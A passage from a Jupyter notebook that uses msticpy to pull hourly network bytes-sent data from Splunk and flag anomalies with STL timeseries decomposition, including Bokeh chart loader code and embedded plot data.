{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Setup"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from IPython.display import Image\n",
    "\n",
    "# If not using Azure Notebooks, install msticpy with\n",
    "# !pip install msticpy\n",
    "from msticpy.nbtools import nbinit\n",
    "extra_imports = [\n",
    "    \"msticpy.nbtools.timeseries, display_timeseries_anomolies\",\n",
    "    \"msticpy.analysis.timeseries, timeseries_anomalies_stl\",\n",
    "    \"msticpy.nbtools.morph_charts, MorphCharts\",\n",
    "    \"datetime, datetime\"\n",
    "]\n",
    "\n",
    "nbinit.init_notebook(\n",
    "    namespace=globals(),\n",
    "    additional_packages=[\"pyvis\"],\n",
    "    extra_imports=extra_imports,\n",
    ");\n",
    "\n",
    "WIDGET_DEFAULTS = {\n",
    "    \"layout\": widgets.Layout(width=\"95%\"),\n",
    "    \"style\": {\"description_width\": \"initial\"},\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Data Acquisition - Splunk"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "splunk_prov = QueryProvider(\"Splunk\")\n",
    "splunk_prov.connect(host=\"splunk-mstic.westus2.cloudapp.azure.com\", username=\"admin\", password=\"xxx\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 210,
   "metadata": {},
   "outputs": [
    {
     "ename": "NameError",
     "evalue": "name 'splunk_prov' is not defined",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mNameError\u001b[0m                                 Traceback (most recent call last)",
      "\u001b[1;32m<ipython-input-210-a491729a46bb>\u001b[0m in \u001b[0;36m<module>\u001b[1;34m\u001b[0m\n\u001b[0;32m      4\u001b[0m \"\"\"\n\u001b[0;32m      5\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m----> 6\u001b[1;33m \u001b[0mstldemo\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0msplunk_prov\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mexec_query\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0msplunk_query\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m        \u001b[1;36mglobal\u001b[0m \u001b[0;36mstldemo\u001b[0m \u001b[1;34m=                      TotalBytesSent\nTimeGenerated                      \n2020-06-29 00:00:00           10823\n2020-06-29 01:00:00           14821\n2020-06-29 02:00:00           13532\n2020-06-29 03:00:00           11947\n2020-06-29 04:00:00           11193\n...                             ...\n2020-07-05 19:00:00           18166\n2020-07-05 20:00:00           13830\n2020-07-05 21:00:00           13350\n2020-07-05 22:00:00           11842\n2020-07-05 23:00:00           11111\n\n[168 rows x 1 columns]\u001b[0m\u001b[1;34m\n        \u001b[0m\u001b[1;36mglobal\u001b[0m \u001b[0;36msplunk_prov.exec_query\u001b[0m \u001b[1;34m= \u001b[1;36mundefined\u001b[0m\u001b[0m\u001b[1;34m\n        \u001b[0m\u001b[1;36mglobal\u001b[0m \u001b[0;36msplunk_query\u001b[0m \u001b[1;34m= \"\\nserach index='blackhat' sourcetype='network' earliest=0\\n| table TimeGenerated, TotalBytesSent\\n\"\u001b[0m\n\u001b[0;32m      7\u001b[0m \u001b[0mstldemo\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mhead\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;31mNameError\u001b[0m: name 'splunk_prov' is not defined"
     ]
    }
   ],
   "source": [
    "splunk_query = \"\"\"\n",
    "serach index='blackhat' sourcetype='network' earliest=0\n",
    "| table TimeGenerated, TotalBytesSent\n",
    "\"\"\"\n",
    "\n",
    "stldemo = splunk_prov.exec_query(splunk_query)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Timeseries Analysis to detected Anomalies"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "    <div class=\"bk-root\">\n",
       "        <a href=\"https://bokeh.org\" target=\"_blank\" class=\"bk-logo bk-logo-small bk-logo-notebook\"></a>\n",
       "        <span id=\"4071\">Loading BokehJS ...</span>\n",
       "    </div>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "\n",
       "(function(root) {\n",
       "  function now() {\n",
       "    return new Date();\n",
       "  }\n",
       "\n",
       "  var force = true;\n",
       "\n",
       "  if (typeof root._bokeh_onload_callbacks === \"undefined\" || force === true) {\n",
       "    root._bokeh_onload_callbacks = [];\n",
       "    root._bokeh_is_loading = undefined;\n",
       "  }\n",
       "\n",
       "  var JS_MIME_TYPE = 'application/javascript';\n",
       "  var HTML_MIME_TYPE = 'text/html';\n",
       "  var EXEC_MIME_TYPE = 'application/vnd.bokehjs_exec.v0+json';\n",
       "  var CLASS_NAME = 'output_bokeh rendered_html';\n",
       "\n",
       "  /**\n",
       "   * Render data to the DOM node\n",
       "   */\n",
       "  function render(props, node) {\n",
       "    var script = document.createElement(\"script\");\n",
       "    node.appendChild(script);\n",
       "  }\n",
       "\n",
       "  /**\n",
       "   * Handle when an output is cleared or removed\n",
       "   */\n",
       "  function handleClearOutput(event, handle) {\n",
       "    var cell = handle.cell;\n",
       "\n",
       "    var id = cell.output_area._bokeh_element_id;\n",
       "    var server_id = cell.output_area._bokeh_server_id;\n",
       "    // Clean up Bokeh references\n",
       "    if (id != null && id in Bokeh.index) {\n",
       "      Bokeh.index[id].model.document.clear();\n",
       "      delete Bokeh.index[id];\n",
       "    }\n",
       "\n",
       "    if (server_id !== undefined) {\n",
       "      // Clean up Bokeh references\n",
       "      var cmd = \"from bokeh.io.state import curstate; print(curstate().uuid_to_server['\" + server_id + \"'].get_sessions()[0].document.roots[0]._id)\";\n",
       "      cell.notebook.kernel.execute(cmd, {\n",
       "        iopub: {\n",
       "          output: function(msg) {\n",
       "            var id = msg.content.text.trim();\n",
       "            if (id in Bokeh.index) {\n",
       "              Bokeh.index[id].model.document.clear();\n",
       "              delete Bokeh.index[id];\n",
       "            }\n",
       "          }\n",
       "        }\n",
       "      });\n",
       "      // Destroy server and session\n",
       "      var cmd = \"import bokeh.io.notebook as ion; ion.destroy_server('\" + server_id + \"')\";\n",
       "      cell.notebook.kernel.execute(cmd);\n",
       "    }\n",
       "  }\n",
       "\n",
       "  /**\n",
       "   * Handle when a new output is added\n",
       "   */\n",
       "  function handleAddOutput(event, handle) {\n",
       "    var output_area = handle.output_area;\n",
       "    var output = handle.output;\n",
       "\n",
       "    // limit handleAddOutput to display_data with EXEC_MIME_TYPE content only\n",
       "    if ((output.output_type != \"display_data\") || (!output.data.hasOwnProperty(EXEC_MIME_TYPE))) {\n",
       "      return\n",
       "    }\n",
       "\n",
       "    var toinsert = output_area.element.find(\".\" + CLASS_NAME.split(' ')[0]);\n",
       "\n",
       "    if (output.metadata[EXEC_MIME_TYPE][\"id\"] !== undefined) {\n",
       "      toinsert[toinsert.length - 1].firstChild.textContent = output.data[JS_MIME_TYPE];\n",
       "      // store reference to embed id on output_area\n",
       "      output_area._bokeh_element_id = output.metadata[EXEC_MIME_TYPE][\"id\"];\n",
       "    }\n",
       "    if (output.metadata[EXEC_MIME_TYPE][\"server_id\"] !== undefined) {\n",
       "      var bk_div = document.createElement(\"div\");\n",
       "      bk_div.innerHTML = output.data[HTML_MIME_TYPE];\n",
       "      var script_attrs = bk_div.children[0].attributes;\n",
       "      for (var i = 0; i < script_attrs.length; i++) {\n",
       "        toinsert[toinsert.length - 1].firstChild.setAttribute(script_attrs[i].name, script_attrs[i].value);\n",
       "        toinsert[toinsert.length - 1].firstChild.textContent = bk_div.children[0].textContent\n",
       "      }\n",
       "      // store reference to server id on output_area\n",
       "      output_area._bokeh_server_id = output.metadata[EXEC_MIME_TYPE][\"server_id\"];\n",
       "    }\n",
       "  }\n",
       "\n",
       "  function register_renderer(events, OutputArea) {\n",
       "\n",
       "    function append_mime(data, metadata, element) {\n",
       "      // create a DOM node to render to\n",
       "      var toinsert = this.create_output_subarea(\n",
       "        metadata,\n",
       "        CLASS_NAME,\n",
       "        EXEC_MIME_TYPE\n",
       "      );\n",
       "      this.keyboard_manager.register_events(toinsert);\n",
       "      // Render to node\n",
       "      var props = {data: data, metadata: metadata[EXEC_MIME_TYPE]};\n",
       "      render(props, toinsert[toinsert.length - 1]);\n",
       "      element.append(toinsert);\n",
       "      return toinsert\n",
       "    }\n",
       "\n",
       "    /* Handle when an output is cleared or removed */\n",
       "    events.on('clear_output.CodeCell', handleClearOutput);\n",
       "    events.on('delete.Cell', handleClearOutput);\n",
       "\n",
       "    /* Handle when a new output is added */\n",
       "    events.on('output_added.OutputArea', handleAddOutput);\n",
       "\n",
       "    /**\n",
       "     * Register the mime type and append_mime function with output_area\n",
       "     */\n",
       "    OutputArea.prototype.register_mime_type(EXEC_MIME_TYPE, append_mime, {\n",
       "      /* Is output safe? */\n",
       "      safe: true,\n",
       "      /* Index of renderer in `output_area.display_order` */\n",
       "      index: 0\n",
       "    });\n",
       "  }\n",
       "\n",
       "  // register the mime type if in Jupyter Notebook environment and previously unregistered\n",
       "  if (root.Jupyter !== undefined) {\n",
       "    var events = require('base/js/events');\n",
       "    var OutputArea = require('notebook/js/outputarea').OutputArea;\n",
       "\n",
       "    if (OutputArea.prototype.mime_types().indexOf(EXEC_MIME_TYPE) == -1) {\n",
       "      register_renderer(events, OutputArea);\n",
       "    }\n",
       "  }\n",
       "\n",
       "  \n",
       "  if (typeof (root._bokeh_timeout) === \"undefined\" || force === true) {\n",
       "    root._bokeh_timeout = Date.now() + 5000;\n",
       "    root._bokeh_failed_load = false;\n",
       "  }\n",
       "\n",
       "  var NB_LOAD_WARNING = {'data': {'text/html':\n",
       "     \"<div style='background-color: #fdd'>\\n\"+\n",
       "     \"<p>\\n\"+\n",
       "     \"BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \\n\"+\n",
       "     \"may be due to a slow or bad network connection. Possible fixes:\\n\"+\n",
       "     \"</p>\\n\"+\n",
       "     \"<ul>\\n\"+\n",
       "     \"<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\\n\"+\n",
       "     \"<li>use INLINE resources instead, as so:</li>\\n\"+\n",
       "     \"</ul>\\n\"+\n",
       "     \"<code>\\n\"+\n",
       "     \"from bokeh.resources import INLINE\\n\"+\n",
       "     \"output_notebook(resources=INLINE)\\n\"+\n",
       "     \"</code>\\n\"+\n",
       "     \"</div>\"}};\n",
       "\n",
       "  function display_loaded() {\n",
       "    var el = document.getElementById(\"4071\");\n",
       "    if (el != null) {\n",
       "      el.textContent = \"BokehJS is loading...\";\n",
       "    }\n",
       "    if (root.Bokeh !== undefined) {\n",
       "      if (el != null) {\n",
       "        el.textContent = \"BokehJS \" + root.Bokeh.version + \" successfully loaded.\";\n",
       "      }\n",
       "    } else if (Date.now() < root._bokeh_timeout) {\n",
       "      setTimeout(display_loaded, 100)\n",
       "    }\n",
       "  }\n",
       "\n",
       "\n",
       "  function run_callbacks() {\n",
       "    try {\n",
       "      root._bokeh_onload_callbacks.forEach(function(callback) {\n",
       "        if (callback != null)\n",
       "          callback();\n",
       "      });\n",
       "    } finally {\n",
       "      delete root._bokeh_onload_callbacks\n",
       "    }\n",
       "    console.debug(\"Bokeh: all callbacks have finished\");\n",
       "  }\n",
       "\n",
       "  function load_libs(css_urls, js_urls, callback) {\n",
       "    if (css_urls == null) css_urls = [];\n",
       "    if (js_urls == null) js_urls = [];\n",
       "\n",
       "    root._bokeh_onload_callbacks.push(callback);\n",
       "    if (root._bokeh_is_loading > 0) {\n",
       "      console.debug(\"Bokeh: BokehJS is being loaded, scheduling callback at\", now());\n",
       "      return null;\n",
       "    }\n",
       "    if (js_urls == null || js_urls.length === 0) {\n",
       "      run_callbacks();\n",
       "      return null;\n",
       "    }\n",
       "    console.debug(\"Bokeh: BokehJS not loaded, scheduling load and callback at\", now());\n",
       "    root._bokeh_is_loading = css_urls.length + js_urls.length;\n",
       "\n",
       "    function on_load() {\n",
       "      root._bokeh_is_loading--;\n",
       "      if (root._bokeh_is_loading === 0) {\n",
       "        console.debug(\"Bokeh: all BokehJS libraries/stylesheets loaded\");\n",
       "        run_callbacks()\n",
       "      }\n",
       "    }\n",
       "\n",
       "    function on_error() {\n",
       "      console.error(\"failed to load \" + url);\n",
       "    }\n",
       "\n",
       "    for (var i = 0; i < css_urls.length; i++) {\n",
       "      var url = css_urls[i];\n",
       "      const element = document.createElement(\"link\");\n",
       "      element.onload = on_load;\n",
       "      element.onerror = on_error;\n",
       "      element.rel = \"stylesheet\";\n",
       "      element.type = \"text/css\";\n",
       "      element.href = url;\n",
       "      console.debug(\"Bokeh: injecting link tag for BokehJS stylesheet: \", url);\n",
       "      document.body.appendChild(element);\n",
       "    }\n",
       "\n",
       "    const hashes = {\"https://cdn.bokeh.org/bokeh/release/bokeh-2.1.1.min.js\": \"kLr4fYcqcSpbuI95brIH3vnnYCquzzSxHPU6XGQCIkQRGJwhg0StNbj1eegrHs12\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.1.1.min.js\": \"xIGPmVtaOm+z0BqfSOMn4lOR6ciex448GIKG4eE61LsAvmGj48XcMQZtKcE/UXZe\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.1.1.min.js\": \"Dc9u1wF/0zApGIWoBbH77iWEHtdmkuYWG839Uzmv8y8yBLXebjO9ZnERsde5Ln/P\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-2.1.1.min.js\": \"cT9JaBz7GiRXdENrJLZNSC6eMNF3nh3fa5fTF51Svp+ukxPdwcU5kGXGPBgDCa2j\"};\n",
       "\n",
       "    for (var i = 0; i < js_urls.length; i++) {\n",
       "      var url = js_urls[i];\n",
       "      var element = document.createElement('script');\n",
       "      element.onload = on_load;\n",
       "      element.onerror = on_error;\n",
       "      element.async = false;\n",
       "      element.src = url;\n",
       "      if (url in hashes) {\n",
       "        element.crossOrigin = \"anonymous\";\n",
       "        element.integrity = \"sha384-\" + hashes[url];\n",
       "      }\n",
       "      console.debug(\"Bokeh: injecting script tag for BokehJS library: \", url);\n",
       "      document.head.appendChild(element);\n",
       "    }\n",
       "  };\n",
       "\n",
       "  function inject_raw_css(css) {\n",
       "    const element = document.createElement(\"style\");\n",
       "    element.appendChild(document.createTextNode(css));\n",
       "    document.body.appendChild(element);\n",
       "  }\n",
       "\n",
       "  \n",
       "  var js_urls = [\"https://cdn.bokeh.org/bokeh/release/bokeh-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-2.1.1.min.js\"];\n",
       "  var css_urls = [];\n",
       "  \n",
       "\n",
       "  var inline_js = [\n",
       "    function(Bokeh) {\n",
       "      Bokeh.set_log_level(\"info\");\n",
       "    },\n",
       "    function(Bokeh) {\n",
       "    \n",
       "    \n",
       "    }\n",
       "  ];\n",
       "\n",
       "  function run_inline_js() {\n",
       "    \n",
       "    if (root.Bokeh !== undefined || force === true) {\n",
       "      \n",
       "    for (var i = 0; i < inline_js.length; i++) {\n",
       "      inline_js[i].call(root, root.Bokeh);\n",
       "    }\n",
       "    if (force === true) {\n",
       "        display_loaded();\n",
       "      }} else if (Date.now() < root._bokeh_timeout) {\n",
       "      setTimeout(run_inline_js, 100);\n",
       "    } else if (!root._bokeh_failed_load) {\n",
       "      console.log(\"Bokeh: BokehJS failed to load within specified timeout.\");\n",
       "      root._bokeh_failed_load = true;\n",
       "    } else if (force !== true) {\n",
       "      var cell = $(document.getElementById(\"4071\")).parents('.cell').data().cell;\n",
       "      cell.output_area.append_execute_result(NB_LOAD_WARNING)\n",
       "    }\n",
       "\n",
       "  }\n",
       "\n",
       "  if (root._bokeh_is_loading === 0) {\n",
       "    console.debug(\"Bokeh: BokehJS loaded, going straight to plotting\");\n",
       "    run_inline_js();\n",
       "  } else {\n",
       "    load_libs(css_urls, js_urls, function() {\n",
       "      console.debug(\"Bokeh: BokehJS plotting callback run at\", now());\n",
       "      run_inline_js();\n",
       "    });\n",
       "  }\n",
       "}(window));"
      ],
      "application/vnd.bokehjs_load.v0+json": "\n(function(root) {\n  function now() {\n    return new Date();\n  }\n\n  var force = true;\n\n  if (typeof root._bokeh_onload_callbacks === \"undefined\" || force === true) {\n    root._bokeh_onload_callbacks = [];\n    root._bokeh_is_loading = undefined;\n  }\n\n  \n\n  \n  if (typeof (root._bokeh_timeout) === \"undefined\" || force === true) {\n    root._bokeh_timeout = Date.now() + 5000;\n    root._bokeh_failed_load = false;\n  }\n\n  var NB_LOAD_WARNING = {'data': {'text/html':\n     \"<div style='background-color: #fdd'>\\n\"+\n     \"<p>\\n\"+\n     \"BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \\n\"+\n     \"may be due to a slow or bad network connection. Possible fixes:\\n\"+\n     \"</p>\\n\"+\n     \"<ul>\\n\"+\n     \"<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\\n\"+\n     \"<li>use INLINE resources instead, as so:</li>\\n\"+\n     \"</ul>\\n\"+\n     \"<code>\\n\"+\n     \"from bokeh.resources import INLINE\\n\"+\n     \"output_notebook(resources=INLINE)\\n\"+\n     \"</code>\\n\"+\n     \"</div>\"}};\n\n  function display_loaded() {\n    var el = document.getElementById(\"4071\");\n    if (el != null) {\n      el.textContent = \"BokehJS is loading...\";\n    }\n    if (root.Bokeh !== undefined) {\n      if (el != null) {\n        el.textContent = \"BokehJS \" + root.Bokeh.version + \" successfully loaded.\";\n      }\n    } else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(display_loaded, 100)\n    }\n  }\n\n\n  function run_callbacks() {\n    try {\n      root._bokeh_onload_callbacks.forEach(function(callback) {\n        if (callback != null)\n          callback();\n      });\n    } finally {\n      delete root._bokeh_onload_callbacks\n    }\n    console.debug(\"Bokeh: all callbacks have finished\");\n  }\n\n  function load_libs(css_urls, js_urls, callback) {\n    if (css_urls == null) css_urls = [];\n    if (js_urls == null) js_urls = [];\n\n    root._bokeh_onload_callbacks.push(callback);\n    if (root._bokeh_is_loading > 0) {\n      console.debug(\"Bokeh: BokehJS is being loaded, scheduling callback at\", now());\n      return null;\n    }\n    if (js_urls == null || js_urls.length === 0) {\n      run_callbacks();\n      return null;\n    }\n    console.debug(\"Bokeh: BokehJS not loaded, scheduling load and callback at\", now());\n    root._bokeh_is_loading = css_urls.length + js_urls.length;\n\n    function on_load() {\n      root._bokeh_is_loading--;\n      if (root._bokeh_is_loading === 0) {\n        console.debug(\"Bokeh: all BokehJS libraries/stylesheets loaded\");\n        run_callbacks()\n      }\n    }\n\n    function on_error() {\n      console.error(\"failed to load \" + url);\n    }\n\n    for (var i = 0; i < css_urls.length; i++) {\n      var url = css_urls[i];\n      const element = document.createElement(\"link\");\n      element.onload = on_load;\n      element.onerror = on_error;\n      element.rel = \"stylesheet\";\n      element.type = \"text/css\";\n      element.href = url;\n      console.debug(\"Bokeh: injecting link tag for BokehJS stylesheet: \", url);\n      document.body.appendChild(element);\n    }\n\n    const hashes = {\"https://cdn.bokeh.org/bokeh/release/bokeh-2.1.1.min.js\": \"kLr4fYcqcSpbuI95brIH3vnnYCquzzSxHPU6XGQCIkQRGJwhg0StNbj1eegrHs12\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.1.1.min.js\": \"xIGPmVtaOm+z0BqfSOMn4lOR6ciex448GIKG4eE61LsAvmGj48XcMQZtKcE/UXZe\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.1.1.min.js\": \"Dc9u1wF/0zApGIWoBbH77iWEHtdmkuYWG839Uzmv8y8yBLXebjO9ZnERsde5Ln/P\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-2.1.1.min.js\": \"cT9JaBz7GiRXdENrJLZNSC6eMNF3nh3fa5fTF51Svp+ukxPdwcU5kGXGPBgDCa2j\"};\n\n    for (var i = 0; i < js_urls.length; i++) {\n      var url = js_urls[i];\n      var element = document.createElement('script');\n      element.onload = on_load;\n      element.onerror = on_error;\n      element.async = false;\n      element.src = url;\n      if (url in hashes) {\n        element.crossOrigin = \"anonymous\";\n        element.integrity = \"sha384-\" + hashes[url];\n      }\n      console.debug(\"Bokeh: injecting script tag for BokehJS library: \", url);\n      document.head.appendChild(element);\n    }\n  };\n\n  function inject_raw_css(css) {\n    const element = document.createElement(\"style\");\n    element.appendChild(document.createTextNode(css));\n    document.body.appendChild(element);\n  }\n\n  \n  var js_urls = [\"https://cdn.bokeh.org/bokeh/release/bokeh-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-2.1.1.min.js\"];\n  var css_urls = [];\n  \n\n  var inline_js = [\n    function(Bokeh) {\n      Bokeh.set_log_level(\"info\");\n    },\n    function(Bokeh) {\n    \n    \n    }\n  ];\n\n  function run_inline_js() {\n    \n    if (root.Bokeh !== undefined || force === true) {\n      \n    for (var i = 0; i < inline_js.length; i++) {\n      inline_js[i].call(root, root.Bokeh);\n    }\n    if (force === true) {\n        display_loaded();\n      }} else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(run_inline_js, 100);\n    } else if (!root._bokeh_failed_load) {\n      console.log(\"Bokeh: BokehJS failed to load within specified timeout.\");\n      root._bokeh_failed_load = true;\n    } else if (force !== true) {\n      var cell = $(document.getElementById(\"4071\")).parents('.cell').data().cell;\n      cell.output_area.append_execute_result(NB_LOAD_WARNING)\n    }\n\n  }\n\n  if (root._bokeh_is_loading === 0) {\n    console.debug(\"Bokeh: BokehJS loaded, going straight to plotting\");\n    run_inline_js();\n  } else {\n    load_libs(css_urls, js_urls, function() {\n      console.debug(\"Bokeh: BokehJS plotting callback run at\", now());\n      run_inline_js();\n    });\n  }\n}(window));"
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "  <div class=\"bk-root\" id=\"ef5b35e3-0982-463a-80be-2ef0e366f3bc\" data-root-id=\"4216\"></div>\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "(function(root) {\n",
       "  function embed_document(root) {\n",
       "    \n",
       "  var docs_json = {\"b730cec6-3877-4669-9034-7e2afa471a88\":{\"roots\":{\"references\":[{\"attributes\":{\"children\":[{\"id\":\"4074\"},{\"id\":\"4186\"}]},\"id\":\"4216\",\"type\":\"Column\"},{\"attributes\":{},\"id\":\"4193\",\"type\":\"LinearScale\"},{\"attributes\":{\"days\":[\"%m-%d %H:%M\"],\"hours\":[\"%H:%M:%S\"],\"milliseconds\":[\"%H:%M:%S.%3N\"],\"minutes\":[\"%H:%M:%S\"],\"seconds\":[\"%H:%M:%S\"]},\"id\":\"4203\",\"type\":\"DatetimeTickFormatter\"},{\"attributes\":{},\"id\":\"4083\",\"type\":\"LinearScale\"},{\"attributes\":{\"months\":[0,6]},\"id\":\"4131\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"overlay\":{\"id\":\"4212\"},\"x_range\":{\"id\":\"4077\"},\"y_range\":null},\"id\":\"4211\",\"type\":\"RangeTool\"},{\"attributes\":{\"axis\":{\"id\":\"4197\"},\"ticker\":null},\"id\":\"4200\",\"type\":\"Grid\"},{\"attributes\":{\"format\":\"00\"},\"id\":\"4108\",\"type\":\"NumeralTickFormatter\"},{\"attributes\":{\"data\":{\"TimeGenerated\":{\"__ndarray__\":\"AACA+dUvd0IAAGho2S93QgAAUNfcL3dCAAA4RuAvd0IAACC14y93QgAACCTnL3dCAADwkuovd0IAANgB7i93QgAAwHDxL3dCAACo3/Qvd0IAAJBO+C93QgAAeL37L3dCAABgLP8vd0IAAEibAjB3QgAAMAoGMHdCAAAYeQkwd0IAAADoDDB3QgAA6FYQMHdCAADQxRMwd0IAALg0FzB3QgAAoKMaMHdCAACIEh4wd0IAAHCBITB3QgAAWPAkMHdCAABAXygwd0IAACjOKzB3QgAAED0vMHdCAAD4qzIwd0IAAOAaNjB3QgAAyIk5MHdCAACw+Dwwd0IAAJhnQDB3QgAAgNZDMHdCAABoRUcwd0IAAFC0SjB3QgAAOCNOMHdCAAAgklEwd0IAAAgBVTB3QgAA8G9YMHdCAADY3lswd0IAAMBNXzB3QgAAqLxiMHdCAACQK2Ywd0IAAHiaaTB3QgAAYAltMHdCAABIeHAwd0IAADDnczB3QgAAGFZ3MHdCAAAAxXowd0IAAOgzfjB3QgAA0KKBMHdCAAC4EYUwd0IAAKCAiDB3QgAAiO+LMHdCAABwXo8wd0IAAFjNkjB3QgAAQDyWMHdCAAAoq5kwd0IAABAanTB3QgAA+IigMHdCAADg96Mwd0IAAMhmpzB3QgAAsNWqMHdCAACYRK4wd0IAAICzsTB3QgAAaCK1MHdCAABQkbgwd0IAADgAvDB3QgAAIG+/MHdCAAAI3sIwd0IAAPBMxjB3QgAA2LvJMHdCAADAKs0wd0IAAKiZ0DB3QgAAkAjUMHdCAAB4d9cwd0IAAGDm2jB3QgAASFXeMHdCAAAwxOEwd0IAABgz5TB3QgAAAKLoMHdCAADoEOwwd0IAANB/7zB3QgAAuO7yMHdCAACgXfYwd0IAAIjM+TB3QgAAcDv9MHdCAABYqgAxd0IAAEAZBDF3QgAAKIgHMXdCAAAQ9woxd0IAAPhlDjF3QgAA4NQRMXdCAADIQxUxd0IAALCyGDF3QgAAmCEcMXdCAACAkB8xd0IAAGj/IjF3QgAAUG4mMXdCAAA43Skxd0IAACBMLTF3QgAACLswMXdCAADwKTQxd0IAANiYNzF3QgAAwAc7MXdCAACodj4xd0IAAJDlQTF3QgAAeFRFMXdCAABgw0gxd0IAAEgyTDF3QgAAMKFPMXdCAAAYEFMxd0IAAAB/VjF3QgAA6O1ZMXdCAADQXF0xd0IAALjLYDF3QgAAoDpkMXdCAACIqWcxd0IAAHAYazF3QgAAWIduMXdCAABA9nExd0IAAChldTF3QgAAENR4MXdCAAD4Qnwxd0IAAOCxfzF3QgAAyCCDMXdCAACwj4Yxd0IAAJj+iTF3QgAAgG2NMXdCAABo3JAxd0IAAFBLlDF3QgAAOLqXMXdCAAAgKZsxd0IAAAiYnjF3QgAA8AaiMXdCAADYdaUxd0IAAMDkqDF3QgAAqFOsMXdCAACQwq8xd0IAAHgxszF3QgAAYKC2MXdCAABID7oxd0IAADB+vTF3QgAAGO3AMXdCAAAAXMQxd0IAAOjKxzF3QgAA0DnLMXdCAAC4qM4xd0IAAKAX0jF3QgAAiIbVMXdCAABw9dgxd0IAAFhk3DF3QgAAQNPfMXdCAAAoQuMxd0IAABCx5jF3QgAA+B/qMXdCAADgju0xd0IAAMj98DF3QgAAsGz0MXdCAACY2/cxd0IAAIBK+zF3QgAAaLn+MXdCAABQKAIyd0IAADiXBTJ3QgAAIAYJMndCAAAIdQwyd0IAAPDjDzJ3QgAA2FITMndC\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[168]},\"TotalBytesSent\":[10823,14821,13532,11947,11193,13257,13375,27975,31501,28775,31398,32979,32241,33539,28420,25757,30947,27803,29637,29670,11563,13465,13587,14967,12964,13858,13119,13907,12739,11227,11268,31322,26683,32982,32544,31414,28254,29893,31290,28334,26328,26448,30576,30793,10484,14995,11715,11296,10487,10789,14758,10998,10682,14572,13689,34167,27286,33955,33700,26810,30679,31533,33739,32815,26046,27499,33974,29118,12821,12836,13819,14877,14220,10053,14690,13161,14334,12806,11771,25544,27355,33777,27055,27816,32648,25686,32147,33363,28923,31547,33575,26369,14754,10415,10286,12086,11414,14915,14479,14063,13211,12485,14759,26964,31469,26214,33556,32596,25150,31064,25338,25714,26089,25673,34013,33699,48616,45856,12184,14179,13841,11097,13724,10535,10022,12570,14145,18473,19477,19080,17622,18725,17612,19733,19338,18656,17732,17801,16167,16485,11455,10545,13991,10699,12735,12639,14501,12477,11497,10081,11729,18121,17458,18104,16508,17814,16494,17588,18545,19534,16085,15276,15363,18166,13830,13350,11842,11111],\"anomalies\":[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],\"baseline\":[10985,13797,13066,12026,11111,12458,12198,30554,29383,31529,32605,32178,31713,32944,30992,27979,29586,27824,30748,30379,7636,11044,13141,13809,12182,13699,14141,12796,12109,13002,12707,30087,28752,31458,31661,30489,30352,30855,30244,28199,27795,27143,30759,29177,11644,13388,12310,13222,12034,12599,14166,12824,12530,13157,13168,29535,28524,31625,31487,30012,30006,30270,30772,29711,27723,28012,32186,29620,17539,17596,12685,13561,12469,12070,14522